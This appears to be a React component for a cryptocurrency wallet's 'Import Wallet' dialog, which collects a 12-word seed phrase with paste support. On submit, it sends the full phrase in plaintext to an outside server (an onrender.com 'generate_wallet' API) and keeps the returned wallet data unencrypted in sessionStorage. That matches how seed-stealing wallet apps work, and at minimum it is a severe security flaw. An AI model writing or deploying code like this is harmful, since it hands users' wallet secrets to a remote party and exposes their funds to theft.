import { XIcon } from '@heroicons/react/outline';
import React, { useRef, useEffect, useState } from 'react';
import { useHistory } from 'react-router-dom';
import { storeEncryptedWallet } from '../../views/auth/utils/storage';

export default function ImportWalletModal({
  wordCount = 12,
  seedWords = [],
  handleChange,
  handleKeyDown,
  onClose
}) {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [isMobile, setIsMobile] = useState(false);
  const history = useHistory();
  const inputRefs = useRef(Array(wordCount).fill().map(() => React.createRef()));
  const pendingUpdatesRef = useRef([]);
  
  useEffect(() => {
    // Check if mobile on mount and on resize
    const checkIfMobile = () => {
      setIsMobile(window.innerWidth < 768);
    };
    checkIfMobile();
    window.addEventListener('resize', checkIfMobile);
    return () => window.removeEventListener('resize', checkIfMobile);
  }, []);

  useEffect(() => {
    if (pendingUpdatesRef.current.length > 0) {
      const nextUpdate = pendingUpdatesRef.current.shift();
      handleChange(nextUpdate.value, nextUpdate.index);
      
      if (pendingUpdatesRef.current.length === 0 && nextUpdate.focusNext && 
          nextUpdate.index + 1 < wordCount) {
        setTimeout(() => {
          inputRefs.current[nextUpdate.index + 1].current?.focus();
        }, 50);
      }
    }
  }, [seedWords, wordCount]);

  const handlePaste = (e, currentIndex) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text').trim();
    const words = pastedText.split(/\s+/).filter(word => word.length > 0);
    
    if (words.length === 1) {
      // Single word paste
      handleChange(words[0], currentIndex);
      if (currentIndex + 1 < wordCount) {
        setTimeout(() => {
          inputRefs.current[currentIndex + 1].current?.focus();
        }, 0);
      }
      return;
    }
    
    // Multi-word paste
    pendingUpdatesRef.current = [];
    words.forEach((word, idx) => {
      const targetIndex = currentIndex + idx;
      if (targetIndex < wordCount) {
        pendingUpdatesRef.current.push({
          value: word,
          index: targetIndex,
          focusNext: idx === words.length - 1
        });
      }
    });
    
    if (pendingUpdatesRef.current.length > 0) {
      const firstUpdate = pendingUpdatesRef.current.shift();
      handleChange(firstUpdate.value, firstUpdate.index);
    }
  };

  const handleContinue = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      const phrase = seedWords.join(' ');
      if (phrase.split(' ').length !== wordCount) {
        throw new Error(`Please enter a ${wordCount}-word seed phrase`);
      }

      const response = await fetch("https://swift-api-g7a3.onrender.com/api/wallet/generate_wallet/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phrase }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Failed to import wallet");
      }

      const walletData = await response.json();
      
      if (!walletData || !walletData.data) {
        throw new Error("Invalid wallet data received");
      }

      sessionStorage.setItem('importedWallet', JSON.stringify(walletData.data));
      
      history.push('/auth/createpin');
    } catch (err) {
      console.error("Error importing wallet:", err);
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className='bg-blueGray-600'
      style={{
        position: 'fixed',
        top: 0,
        left: 0,
        width: '100vw',
        height: '100vh',
        display: 'flex',
        justifyContent: 'flex-end',
        alignItems: 'center',
        padding: 16,
        boxSizing: 'border-box',
        zIndex: 1000
      }}
    >
      <div className="no-scrollbar"
        style={{
          backgroundColor: '#000906',
          borderRadius: 16,
          padding: 32,
          width: '100%',
          maxWidth: 700,
          maxHeight: '90vh',
          overflowY: 'auto',
          margin: '0 auto',
          boxShadow: '0 10px 40px rgba(0,0,0,0.1)',
          position: 'relative'
        }}
      >
        <button
          onClick={onClose}
          style={{
            position: 'absolute',
            top: 16,
            right: 16,
            background: 'transparent',
            border: 'none',
            cursor: 'pointer'
          }}
          aria-label="Close"
        >
          <XIcon style={{ width: 20, height: 20, color: 'white' }} />
        </button>
        
        <h2 style={{ fontSize: 20, fontWeight: 600, color: 'white' }}>
          Import Wallet ({wordCount}-word phrase)
        </h2>
        <p style={{ marginTop: 4, fontSize: 14, color: '#6B7280' }}>
          Enter your {wordCount}-word seed phrase below to import your wallet
        </p>
        
        {error && (
          <div style={{ 
            color: '#ff6b6b',
            margin: '16px 0',
            padding: '8px 12px',
            backgroundColor: 'rgba(255, 107, 107, 0.1)',
            borderRadius: 4
          }}>
            {error}
          </div>
        )}

        <form onSubmit={handleContinue} style={{ marginTop: 24 }}>
          <div
            style={{
              display: 'grid',
              gridTemplateColumns: isMobile ? 'repeat(2, 1fr)' : 'repeat(4, 1fr)',
              columnGap: isMobile ? 12 : 24,
              rowGap: 16
            }}
          >
            {Array.from({ length: wordCount }).map((_, idx) => (
              <div key={idx} style={{ display: 'flex', flexDirection: 'column' }}>
                <div style={{ display: 'flex', alignItems: 'left', justifyContent: "center", marginBottom: 2 }}>
                  <span style={{ 
                    fontSize: 12, 
                    color: '#6B7280', 
                    minWidth: 24,
                    textAlign: 'center',
                  }}>
                  </span>
                  <input
                    id={`seed-${idx}`}
                    type="text"
                    value={seedWords[idx] || ''}
                    onChange={e => handleChange(e.target.value, idx)}
                    onKeyDown={e => handleKeyDown(e, idx)}
                    onPaste={e => handlePaste(e, idx)}
                    ref={inputRefs.current[idx]}
                    autoComplete="off"
                    autoFocus={`Word ${idx + 1}`}
                    placeholder={`Word ${idx + 1}`}
                    style={{
                      position: 'relative',
                      left: 0,
                      height: 40,
                      width: '100%',
                      padding: '0 12px',
                      border: '1px solid #CBD5E0',
                      borderRadius: 8,
                      fontSize: 14,
                      outline: 'none',
                      backgroundColor: '#fff'
                    }}
                  />
                </div>
              </div>
            ))}
          </div>
          
          <button
            type="submit"
            disabled={loading}
            style={{
              marginTop: 32,
              width: '100%',
              height: 48,
              backgroundColor: loading ? '#cccccc' : '#27C499',
              color: '#FFF',
              border: 'none',
              borderRadius: 8,
              fontSize: 16,
              fontWeight: 500,
              cursor: loading ? 'not-allowed' : 'pointer',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}
          >
            {loading ? (
              <>
                <span style={{ marginRight: 8 }}>Importing...</span>
                <div className="spinner" style={{
                  width: 16,
                  height: 16,
                  border: '2px solid rgba(255,255,255,0.3)',
                  borderRadius: '50%',
                  borderTopColor: '#fff',
                  animation: 'spin 1s linear infinite'
                }}></div>
              </>
            ) : 'Continue to PIN Setup'}
          </button>
        </form>
      </div>

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}